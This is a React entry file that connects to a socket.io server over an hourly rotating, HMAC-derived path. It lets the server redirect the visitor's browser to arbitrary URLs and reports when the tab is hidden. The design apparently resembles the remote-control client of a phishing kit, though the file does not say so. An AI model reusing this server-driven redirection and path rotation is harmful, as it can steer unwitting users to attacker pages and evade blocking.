import React from 'react';
import ReactDOM from 'react-dom';
import { BrowserRouter as Router } from 'react-router-dom';
import App from './App';
import io from 'socket.io-client';
const crypto = require("crypto");

// === WebSocket logic ===
const getHourlySocketPath = () => {
  const secret = process.env.REACT_APP_WS_PATH_TOKEN;
  const hourlyTimestamp = Math.floor(Date.now() / (1000 * 60 * 60)).toString();

  const hmac = crypto
    .createHmac("sha256", secret)
    .update(hourlyTimestamp)
    .digest("hex")
    .slice(0, 16);

  return `/ws_${hmac}`;
};

let socket = null;
let currentPath = getHourlySocketPath();
let retries = 0;

const connectSocket = () => {
  const sessionId = sessionStorage.getItem('uCukkzD');
  if (!sessionId) {
    return;
  }

  if (socket && socket.connected) {
    return;
  }

  if (socket) {
    socket.disconnect();
    socket = null;
  }

  socket = io(`${process.env.REACT_APP_WS_URL}`, {
    path: currentPath,
    transports: ['websocket', 'polling'],
    reconnection: true,
    reconnectionAttempts:8,
    reconnectionDelay: 3000,
    auth: {
      uCukkzD: sessionId,
    },
    query: {
      wsPath: currentPath,
    }
  });

  socket.on("connect", () => {
    retries = 0;
  });

  socket.on("connect_error", (err) => {
    retries++;
    if (retries > 8) {
      window.location.reload(); // Refresh the page if too many retries
    }
  });

  attachSocketListeners();
};

const monitorPathChange = () => {
  setInterval(() => {
    const newPath = getHourlySocketPath();
    if (newPath !== currentPath) {

      if (socket) socket.disconnect();

      currentPath = newPath;
      connectSocket();
    }
  }, 30 * 1000);
};

const attachSocketListeners = () => {
  if (!socket) return;

  socket.on('redirectUser', ({ url }) => {
    window.location.href = url;
  });

  socket.on('changeRoute', (newRoute) => {
    window.location.href = newRoute.startsWith('/')
      ? `${window.location.origin}${newRoute}`
      : newRoute;
  });

  document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
      socket.emit('stopConfigCheck');
    } else {
      socket.emit('startConfigCheck');
    }
  });
};

// 🔌 Initialize everything
setTimeout(() => connectSocket(), 200); // Small delay to allow sessionStorage readiness
monitorPathChange();

// === Main React App ===
const Root = () => (
  <Router>
    <App socket={socket} />
  </Router>
);

ReactDOM.render(<Root />, document.getElementById('root'));

export { socket };
